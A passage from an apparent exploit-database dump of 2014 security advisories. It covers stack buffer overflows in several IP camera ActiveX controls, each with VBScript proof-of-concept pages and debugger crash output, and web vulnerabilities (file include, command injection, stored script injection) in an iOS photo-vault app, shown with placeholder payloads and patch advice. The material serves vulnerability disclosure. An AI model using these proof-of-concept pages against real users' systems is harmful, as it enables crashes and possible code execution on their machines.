memberName = ""SetCGIAPNAME""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.SetCGIAPNAME = arg1
</script>
</html>
---5
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let Password As String""
memberName = ""Password""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.Password = arg1
</script>
</html>
---6
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let UserName As String""
memberName = ""UserName""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.UserName = arg1
</script>
</html>
---7
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let SnapFileName As String""
memberName = ""SnapFileName""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.SnapFileName = arg1
</script>
</html>
---8
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function OpenFolder ( ByVal sInitPath As String ) As String""
memberName = ""OpenFolder""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.OpenFolder arg1
</script>
</html>
---9
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function CGI_ParamGet ( ByVal sGroup As String ,  ByVal sName As String ) As String""
memberName = ""CGI_ParamGet""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 2
arg1=String(1044, ""A"")
arg2=""defaultV""
target.CGI_ParamGet arg1 ,arg2
</script>
</html>
---10
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function CGI_ParamSet ( ByVal sGroup As String ,  ByVal sName As String ,  ByVal SVal As String ) As Long""
memberName = ""CGI_ParamSet""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 3
arg1=String(1044, ""A"")
arg2=""defaultV""
arg3=""defaultV""
target.CGI_ParamSet arg1 ,arg2 ,arg3
</script>
</html>"
2014-12-02,Remote,Hardware,LiquidWorm,IPUX CL5452/CL5132 IP Camera,'UltraSVCamX.ocx' ActiveX Stack Buffer Overflow,"Summary: The device is H.264 Wired/Wireless IP Camera with 1.3 Mega-pixel sensor.
Desc: The UltraSVCam ActiveX Control 'UltraSVCamX.ocx' suffers from a stack buffer","IPUX CL5452/CL5132 IP Camera (UltraSVCamX.ocx) ActiveX Stack Buffer Overflow
Vendor: Big Good Holdings Limited | Fitivision Technology Inc.
Product web page: http://www.ipux.net | http://www.fitivision.com
Affected version: Bullet Type ICL5132 (firmware: ICL5132 2.0.0-2 20130730 r1112)
Bullet Type ICL5452
With high performance H.264 video compression, the file size of video stream is
extremely reduced, as to optimize the network bandwidth efficiency. It has full
Pan/Tilt function and 3X digital zoom feature for a larger space monitoring. The
built-in USB port provides a convenient and portable storage option for local storage
of event and schedule recording, especially network disconnected.
overflow vulnerability when parsing large amount of bytes to several functions in
UltraSVCamLib, resulting in memory corruption overwriting several registers including
the SEH. An attacker can gain access to the system of the affected node and execute
arbitrary code.
(3ef0.3e0c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\Downloaded Program Files\UltraSVCamX.ocx -
eax=41414149 ebx=00000001 ecx=00003e0c edx=02163f74 esi=41414141 edi=02163f74
eip=77e8466c esp=003eef8c ebp=003eefc0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
ntdll!RtlDeleteCriticalSection+0x77:
77e8466c 833800          cmp     dword ptr [eax],0    ds:002b:41414149=????????
Tested on: Microsoft Windows 7 Professional SP1 (EN)
Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2014-5213
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5213.php
16.11.2014
Properties:
FileDescriptionUltraSVCam ActiveX Control
FileVersion1, 0, 53, 34 and 1, 0, 53, 33
InternalNameUltraSVCamX
OriginalFileNameUltraSVCamX.ocx
ProductNameUltraSVCam device ActiveX Control
ProductVersion1, 0, 53, 34 and 1, 0, 53, 33
List of members:
Interface IUltraSVCamX : IDispatch
Default Interface: True
Members : 51
RemoteHost
RemotePort
AccountCode
Password
UserName
fChgImageSize
ImgWidth
ImgHeight
SnapFileName
AVIRecStart
SetImgScale
OpenFolder
OpenFileDlg
TriggerStatus
AVIRecStatus
PlayVideo
SetAutoScale
SetPTUserAllow
SetLanguage
SetFullScreen
SetZoom
SetDirectShow
SetROIParam
FOpen
FSeek
FDeleteFile
Vulnerable members of the class:
RemoteHost
AccountCode
SnapFileName
OpenFolder
PoC(s):
---1
<html>
<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraSVCamX.ocx""
prototype  = ""Property Let RemoteHost As String""
memberName = ""RemoteHost""
progid     = ""UltraSVCamLib.UltraSVCamX""
argCount   = 1
arg1=String(11284, ""A"")
target.RemoteHost = arg1
</script>
</html>
---2
<html>
<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraSVCamX.ocx""
prototype  = ""Property Let AccountCode As String""
memberName = ""AccountCode""
progid     = ""UltraSVCamLib.UltraSVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.AccountCode = arg1
</script>
</html>
---3
<html>
<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraSVCamX.ocx""
prototype  = ""Property Let SnapFileName As String""
memberName = ""SnapFileName""
progid     = ""UltraSVCamLib.UltraSVCamX""
argCount   = 1
arg1=String(11284, ""A"")
target.SnapFileName = arg1
</script>
</html>
---4
<html>
<object classid='clsid:33AD836E-B04E-4114-B39F-AB77AAA08487' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraSVCamX.ocx""
prototype  = ""Function OpenFolder ( ByVal sInitPath As String ) As String""
memberName = ""OpenFolder""
progid     = ""UltraSVCamLib.UltraSVCamX""
argCount   = 1
arg1=String(2068, ""A"")
target.OpenFolder arg1
</script>
</html>"
2014-12-02,Remote,Hardware,LiquidWorm,IPUX Cube Type CS303C IP Camera,'UltraMJCamX.ocx' ActiveX Stack Buffer Overflow,"Summary: The device is Day and Night Cube Network camera with CMOS sensor. With
Desc: The UltraMJCam ActiveX Control 'UltraMJCamX.ocx' suffers from a stack buffer","﻿
IPUX Cube Type CS303C IP Camera (UltraMJCamX.ocx) ActiveX Stack Buffer Overflow
Vendor: Big Good Holdings Limited | Fitivision Technology Inc.
Product web page: http://www.ipux.net | http://www.fitivision.com
Affected version: Cube Type ICS303C (firmware: ICS303C 1.0.0-17 20140120 r1511)
Motion JPEG video compression, the file size of video stream is extremely reduced,
as to optimize the network bandwidth efficiency. It has 3X digital zoom feature for
a larger space monitoring. The ICS303C comes with a IR-cut filter and 4 built-in IR
illuminators for both day and night applications.
overflow vulnerability when parsing large amount of bytes to several functions in
UltraMJCamLib, resulting in memory corruption overwriting several registers including
the SEH. An attacker can gain access to the system of the affected node and execute
arbitrary code.
(48d0.2e98): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\Downloaded Program Files\UltraMJCamX.ocx -
eax=41414149 ebx=00000001 ecx=00002e98 edx=02636d5b esi=41414141 edi=02636d5b
eip=7796466c esp=0038ebf4 ebp=0038ec28 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
ntdll!RtlDeleteCriticalSection+0x77:
7796466c 833800          cmp     dword ptr [eax],0    ds:002b:41414149=????????
Tested on: Microsoft Windows 7 Professional SP1 (EN)
Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2014-5214
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5214.php
16.11.2014
Properties:
FileDescriptionUltraMJCam ActiveX Control
FileVersion1, 0, 52, 23
InternalNameUltraMJCamX
OriginalFileNameUltraMJCamX.ocx
ProductNameUltraMJCam device ActiveX Control
ProductVersion1, 0, 52, 23
List of members:
Interface IUltraMJCamX : IDispatch
Default Interface: True
Members : 65
RemoteHost
RemotePort
AccountCode
GetConfigValue
SetConfigValue
SetCGIAPNAME
Password
UserName
fChgImageSize
ImgWidth
ImgHeight
SnapFileName
AVIRecStart
SetImgScale
OpenFolder
OpenFileDlg
TriggerStatus
AVIRecStatus
Event_Frame
PlayVideo
SetAutoScale
Event_Signal
WavPlay
CGI_ParamGet
CGI_ParamSet
MulticastEnable
MulticastStatus
SetPTUserAllow
SetLanguage
TimestampEnable
TimestampStroke
Vulnerable members of the class:
RemoteHost
AccountCode
SetCGIAPNAME
Password
Username
SnapFileName
OpenFolder
CGI_ParamGet
CGI_ParamSet
PoC(s):
---1
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Property Let RemoteHost As String""
memberName = ""RemoteHost""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.RemoteHost = arg1
</script>
</html>
---2
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Property Let AccountCode As String""
memberName = ""AccountCode""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(3092, ""A"")
target.AccountCode = arg1
</script>
</html>
---3
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Property Let SetCGIAPNAME As String""
memberName = ""SetCGIAPNAME""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(3092, ""A"")
target.SetCGIAPNAME = arg1
</script>
</html>
---4
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Property Let Password As String""
memberName = ""Password""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(2068, ""A"")
target.Password = arg1
</script>
</html>
---5
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Property Let UserName As String""
memberName = ""UserName""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(4116, ""A"")
target.UserName = arg1
</script>
</html>
---6
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Property Let SnapFileName As String""
memberName = ""SnapFileName""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(4116, ""A"")
target.SnapFileName = arg1
</script>
</html>
---7
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Function OpenFolder ( ByVal sInitPath As String ) As String""
memberName = ""OpenFolder""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 1
arg1=String(5140, ""A"")
target.OpenFolder arg1
</script>
</html>
---8
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Function CGI_ParamGet ( ByVal sGroup As String ,  ByVal sName As String ) As String""
memberName = ""CGI_ParamGet""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 2
arg1=String(4116, ""A"")
arg2=""defaultV""
target.CGI_ParamGet arg1 ,arg2
</script>
</html>
---9
<html>
<object classid='clsid:950D732B-EF81-4DC0-A7F2-8A46D94CF55C' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraMJCamX.ocx""
prototype  = ""Function CGI_ParamSet ( ByVal sGroup As String ,  ByVal sName As String ,  ByVal SVal As String ) As Long""
memberName = ""CGI_ParamSet""
progid     = ""UltraMJCamLib.UltraMJCamX""
argCount   = 3
arg1=String(10260, ""A"")
arg2=""defaultV""
arg3=""defaultV""
target.CGI_ParamSet arg1 ,arg2 ,arg3
</script>
</html>"
2014-11-25,DoS,Windows,LiquidWorm,TRENDnet SecurView Wireless Network Camera TV-IP422WN,'UltraCamX.ocx' Stack Buffer Overflow (PoC),"Summary: SecurView Wireless N Day/Night Pan/Tilt Internet Camera, a powerful
Desc: The UltraCam ActiveX Control 'UltraCamX.ocx' suffers from a stack buffer","﻿
TRENDnet SecurView Wireless Network Camera TV-IP422WN (UltraCamX.ocx) Stack BoF
Vendor: TRENDnet
Product web page: http://www.trendnet.com
Affected version: TV-IP422WN/TV-IP422W
dual-codec wireless network camera with the 2-way audio function that provides
the high-quality image and on-the-spot audio via the Internet connection.
overflow vulnerability when parsing large amount of bytes to several functions
in UltraCamLib, resulting in memory corruption overwriting severeal registers
including the SEH. An attacker can gain access to the system of the affected
node and execute arbitrary code.
0:000> r
eax=41414141 ebx=100ceff4 ecx=0042df38 edx=00487900 esi=00487a1c edi=0042e9fc
eip=100203fb esp=0042d720 ebp=0042e9a8 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210212
UltraCamX!DllUnregisterServer+0xeb2b:
100203fb 8b48e0          mov     ecx,dword ptr [eax-20h] ds:002b:41414121=????????
0:000> !exchain
0042eda8: 41414141
Invalid exception stack at 41414141
Tested on: Microsoft Windows 7 Professional SP1 (EN)
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2014-5211
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5211.php
16.11.2014
Properties:
FileDescriptionUltraCam ActiveX Control
FileVersion1, 1, 52, 16
InternalNameUltraCamX
OriginalFileNameUltraCamX.ocx
ProductNameUltraCam device ActiveX Control
ProductVersion1, 1, 52, 16
List of members:
Interface IUltraCamX : IDispatch
Default Interface: True
Members : 62
RemoteHost
RemotePort
AccountCode
GetConfigValue
SetConfigValue
SetCGIAPNAME
Password
UserName
fChgImageSize
ImgWidth
ImgHeight
SnapFileName
AVIRecStart
SetImgScale
OpenFolder
OpenFileDlg
TriggerStatus
AVIRecStatus
Event_Frame
PlayVideo
SetAutoScale
Event_Signal
WavPlay
CGI_ParamGet
CGI_ParamSet
MulticastEnable
MulticastStatus
SetPTUserAllow
Vulnerable members of the class:
CGI_ParamSet
OpenFileDlg
SnapFileName
Password
SetCGIAPNAME
AccountCode
RemoteHost
PoC(s):
<html>
<object classid='clsid:E1B26101-23FB-4855-9171-F79F29CC7728' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraCamX.ocx""
prototype  = ""Property Let SnapFileName As String""
memberName = ""SnapFileName""
progid     = ""UltraCamLib.UltraCamX""
argCount   = 1
thricer=String(8212, ""A"")
target.SnapFileName = thricer
</script>
</html>
eax=41414141 ebx=00809590 ecx=41414141 edx=031e520f esi=0080c4d4 edi=00000009
eip=1002228c esp=003befb4 ebp=003befbc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
UltraCamX!DllUnregisterServer+0x109bc:
1002228c 0fb64861        movzx   ecx,byte ptr [eax+61h]     ds:002b:414141a2=??
<html>
<object classid='clsid:E1B26101-23FB-4855-9171-F79F29CC7728' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraCamX.ocx""
prototype  = ""Function OpenFileDlg ( ByVal sFilter As String ) As String""
memberName = ""OpenFileDlg""
progid     = ""UltraCamLib.UltraCamX""
argCount   = 1
thricer=String(2068, ""A"")
target.OpenFileDlg thricer
</script>
</html>
0:000> r
eax=41414141 ebx=100ceff4 ecx=0042df38 edx=00487900 esi=00487a1c edi=0042e9fc
eip=100203fb esp=0042d720 ebp=0042e9a8 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210212
UltraCamX!DllUnregisterServer+0xeb2b:
100203fb 8b48e0          mov     ecx,dword ptr [eax-20h] ds:002b:41414121=????????
0:000> !exchain
0042eda8: 41414141
Invalid exception stack at 41414141"
2014-02-25,WebApps,iOS,Vulnerability-Lab,Private Camera Pro 5.0 iOS,Multiple Vulnerabilities,http://www.vulnerability-lab.com/get_content.php?id=1216,"Document Title:
Private Camera Pro v5.0 iOS - Multiple Web Vulnerabilities
References (Source):
Release Date:
2014-02-24
Vulnerability Laboratory ID (VL-ID):
1216
Common Vulnerability Scoring System:
8.1
Product & Service Introduction:
Private Camera is an iPhone and iPad camera app that could protect your privacy. It supports taking photos and recording videos, password
lock protect, Fake password guest mode, share photos anytime and anywhere. Take photos and videos quick and easily. Support autofocus,
tap to focus, flash light switch, camera switch, brand new UI, easy to use. Support taking still photo and recording video. Switch the
video and photo mode one click. Create, rename, delete album, set album cover. Add photos to Album, remove photos from Album. Multiple photos
can be handled at a time, you can import photos from system camera roll, export photos to system camera roll, add photos to album, remove photos
from album, delete multiple photos. Wi-Fi web access for photos upload, you can upload many photos from computer to iPhone or iPad in one shot.
With iOS 5, Private Camera can sync all your photos and videos on your iCloud account, you can access these photos & videos on all your iOS
devices, use and share these photos & videos anytime, everywhere. Protect photos and videos that you don’t want to share. User requires enter
password when access the photos/videos library. Share photos and videos on Twitter, Facebook, Email with your friends.
With Password-lock functionality, can protect your personal photos and videos. Its unique Pseudo-password(decoy-password) guest mode,
can cope with annoying friends from seeing your private photos and videos. With easy to use camera features, let you using iPhone or
iPad take photos & videos and enjoy your photography life!
( Copy of the Homepage: https://itunes.apple.com/us/app/private-camera-photo-vault/id477970594 )
( Copy of the Homepage: https://itunes.apple.com/us/app/private-camera-pro-photo-vault/id473538611 )
Abstract Advisory Information:
The Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the official Private Camera Pro v5.0 iOS mobile web-application.
Vulnerability Disclosure Timeline:
2014-02-24:Public Disclosure (Vulnerability Laboratory)
Discovery Status:
Published
Affected Product(s):
Apple AppStore
Product: Private Camera Pro - iOS Web Application 5.0
Exploitation Technique:
Remote
Severity Level:
High
Technical Details & Description:
1.1
A local file include vulnerability has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests
or system specific path commands to compromise the web-application/device.
The vulnerability is located in the upload module of the mobile web-application web-interface. Remote attackers can
manipulate the `upload > submit` POST method request with the vulnerable `filename` value to compromise the application
or connected device components. The issue allows remote attackers to include local app path values or wifi web-server files.
The exploitation appears on the application-side and the inject request method is POST. The exection occurs in the main index
file dir list. The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability
scoring system) count of 7.2(+)|(-)7.3.
Exploitation of the local file include vulnerability requires no user interaction or privileged mobile application user account.
Successful exploitation of the file include web vulnerability results in mobile application compromise, connected device compromise
or web-server compromise.
Request Method(s):
[+] POST
Vulnerable Module(s):
[+] Upload (UI) & Import (Device Sync)
Vulnerable Parameter(s):
[+] filename
Affected Module(s):
[+] File Dir Index Listing
1.2
A local command/path injection web vulnerabilities has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.
A command inject vulnerability allows attackers to inject local commands via vulnerable system values to compromise the apple mobile iOS application.
The vulnerability is located in the vulnerable `[devicename] (srvName)` value of the device-info module. Local attackers are able to inject own malicious
system specific commands or path value requests as the physical iOS hardware devicename. The execution of the injected command or path request occurs with
persistent attack vector in the device-info listing module of the web interface. The security risk of the local command/path inject vulnerability is estimated
as high(-) with a cvss (common vulnerability scoring system) count of 6.5(+)|(-)6.6.
Exploitation of the command/path inject vulnerability requires a low privileged iOS device account with restricted access and no user interaction.
Successful exploitation of the vulnerability results in unauthorized execution of system specific commands and unauthorized path value requests to
compromise the mobile iOS application or the connected device components.
Request Method(s):
[+] POST
Vulnerable Module(s):
[+] Content > header-title
Vulnerable Parameter(s):
[+] devicename
Affected Module(s):
[+] Index- File Dir Listing
[+] Sub Folder/Category - File Dir Listing
1.3
A persistent input validation vulnerability has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.
A persistent input validation vulnerability allows remote attackers to inject own malicious script codes on the application-side
of the affected application web-server.
The vulnerability is located in the add `New Album` input field. The vulnerability allows remote attackers to inject
own malicious script codes on the application-side of the index path/folder listing. The script code execute occurs
in the index `Albums Index` listing with the vulnerable album_title parameter. The inject can be done local by the device
via add album sync function or remote by an inject via upload in the web-interface. The attack vector is persistent and
the injection request method is POST. The security risk of the persistent input validation web vulnerability in the
albumtitle value is estimated as high(-) with a cvss (common vulnerability scoring system) count of 4.2(+)|(-)4.3.
Exploitation of the persistent script code inject vulnerability via POST method request requires low user interaction
and no privileged web-interface user account. Only the sync add album sync function of the reproduce via device requires
physical access.
Request Method(s):
[+] POST
Vulnerable Module(s):
[+] Albums Add (UI) & Import (Snyc Device)
Vulnerable Module(s):
[+] album_title
Affected Module(s):
[+] Album Index & Sub Category Index
Proof of Concept (PoC):
1.1
the local file include web vulnerability can be exploited by remote attackers without privileged web-application user account or
user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
PoC: Albums
<div class=""btn btn-mini directDownload"" title=""Download photo"">Download</div></div></li><li class=""span2 thumbnail_warp"">
<div class=""thumbnail_image""><a href=""http://192.168.2.109/origins/PC_20140223160359211.jpg"" class=""thumbnail"" w=""480"" h=""320""
t=""0"" u=""PC_20140223160359211.jpg""><img style=""display: block;"" src=""Default%20Album_filename-Dateien/PC_20140223160359211.jpg""
data-original=""/photos/thumbnails/PC_20140223160359211.jpg"" class=""photo_image""><div class=""inner_icons""> </div></a>
<div class=""thumbnail_overlay""><img style=""display: none;"" src=""Default%20Album_filename-Dateien/zoomout_icon.png""
class=""zoomout_icon"" title=""origin photo""></div></div><div style=""display: none;"" class=""photo-edit-bar""><label class=""checkbox inline"">15<input
id=""15"" name=""0"" value=""./[LOCAL FILE INCLUDE VULNERABILITY!].jpg"" type=""checkbox""></label><div class=""btn btn-mini directDownload""
title=""Download photo"">Download</div></div></li></ul></div>
--- PoC Session Logs [POST] ---
Status: 200[OK]
POST http://localhost/asset/addAsset Load Flags[LOAD_BYPASS_CACHE  ] Größe des Inhalts[462] Mime Type[application/json]
Request Header:
Host[localhost]
User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0]
Accept[application/json, text/javascript, */*; q=0.01]
Accept-Language[de-de,de;q=0.8,en-us;q=0.5,en;q=0.3]
Accept-Encoding[gzip, deflate]
X-Requested-With[XMLHttpRequest]
Referer[http://localhost/]
Content-Length[24791]
Content-Type[multipart/form-data; boundary=---------------------------27557158176485]
Connection[keep-alive]
Pragma[no-cache]
Cache-Control[no-cache]
POST-Daten:
POST_DATA[-----------------------------27557158176485
Content-Disposition: form-data; name=""params""
name:Default%20Album|url:82A29591-4E94-4313-B4A6-B527A1A551AE|id:SYS_ALBUM_DEFAULT
-----------------------------27557158176485
Content-Disposition: form-data; name=""files[]""; filename=""./[LOCAL FILE INCLUDE VULNERABILITY!]""
Content-Type: image/jpeg
1.2
The local command inject web vulnerability can be exploited by remote attackers with physical device access and without user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
PoC: Device Info > device_info_list > srvname > device-info > [devicename] (srvName)
<div aria-hidden=""false"" style=""display: block;"" id=""modal_serverInfo"" class=""modal hide fade in"">
<div class=""modal-header"">
<a class=""close"" data-dismiss=""modal"">×</a>
<h4>Device info</h4>
</div>
<div class=""modal-body"">
<ul class=""device_info_list"">
<li>Name:<span id=""srvName"" class=""device-info"">bkm337¥""><%20""./[LOCAL COMMAND INJECT VULNERABILITY!]""><if></span></li>
<li>Model:<span id=""srvModel"" class=""device-info"">iPad 4 (WiFi)</span></li>
<li>iOS Version:<span id=""srvVer"" class=""device-info"">7.0.6</span></li>
<li>Free Space:<span id=""srvFree"" class=""device-info"">9.993 GB</span></li>
<li>Support Video:<span id=""srvSupported"" class=""device-info"">MOV, M4V, MP4</span></li>
</ul>
</div>
<div class=""modal-footer"">
<a href=""#"" class=""btn"" data-dismiss=""modal"">Close</a>
</div>
</div>
Note: Inject your payload as iOS devicename (phone or ipad). The execution occurs in the device-info section of the web-interface.
1.2
The persistent input validation web vulnerability can be exploited by remote attackers with low privileged application user account and
low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
PoC: File Dir Index >  album_title
<div class=""span12 content-body index_page"" id=""indexDropbox""><ul class=""thumbnails"" id=""albums""><li class=""album_warp"">
<a href=""#"" n=""Default%20Album"" u=""SYS_ALBUM_DEFAULT"" albumtype=""1"" editable=""true"" class=""thumbnail thumbnailAlbum"">
<img src=""Albums_foldername-Dateien/SYS_ALBUM_DEFAULT.jpg"" class=""album_image""><h5 class=""album_title"">Default Album</h5>
<p class=""album_desc 1"">15 Photos</p></a></li><li class=""album_warp""><a href=""#"" n=""%20"">[PERSISTENT INJECTED SCRIPT CODE!]""
u=""E2569E17-2254-46D9-992C-82833B92F535"" albumtype=""0"" editable=""true"" class=""thumbnail thumbnailAlbum"">
<img src=""Albums_foldername-Dateien/E2569E17-2254-46D9-992C-82833B92F535.jpg"" class=""album_image"">
<h5 class=""album_title"">><%20"">[PERSISTENT INJECTED SCRIPT CODE!]"">  ""><%20"">[PERSISTENT INJECTED SCRIPT CODE!]></h5>
<p class=""album_desc 0"">7 Photos</p></a></li></iframe></h5></a></li></ul></div>
Note: Use the sync function when processing to import to inject the persistent code to the file dir index of the web-interface.
Solution - Fix & Patch:
1.1
The local file include web vulnerability can be patched by a secure parse and validation of the filename value in the upload file POst method request.
1.2
The local command inject web vulnerability can be fixed by a secure encode of the vulnerable devicename value in the service information module.
1.3
The persistent input validation web vulnerability can be patched by a secure parse and encode of the vulnerable albumname value.
Restrict the albumname add and rename function to prevent further persistent script code injects via POST method request.
Security Risk:
1.1
The security risk of the local file include web vulnerability is estimated as high(+).
1.2
The security risk of the local command inject web vulnerability is estimated as high(-).
1.3
The security risk of the persistent input validation web vulnerability is estimated as medium(+).
Credits & Authors:
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
Disclaimer & Information:
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases
or trade with fraud/stolen material.
Domains:    www.vulnerability-lab.com   - www.vuln-lab.com       - www.evolution-sec.com
Contact:    admin@vulnerability-lab.com - research@vulnerability-lab.com        - admin@evolution-sec.com
Section:    www.vulnerability-lab.com/dev - forum.vulnerability-db.com        - magazine.vulnerability-db.com
Social:    twitter.com/#!/vuln_lab - facebook.com/VulnerabilityLab        - youtube.com/user/vulnerability0lab
Feeds:    vulnerability-lab.com/rss/rss.php- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php
Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),
modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
Copyright © 2014 | Vulnerability Laboratory [Evolution Security]
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com"
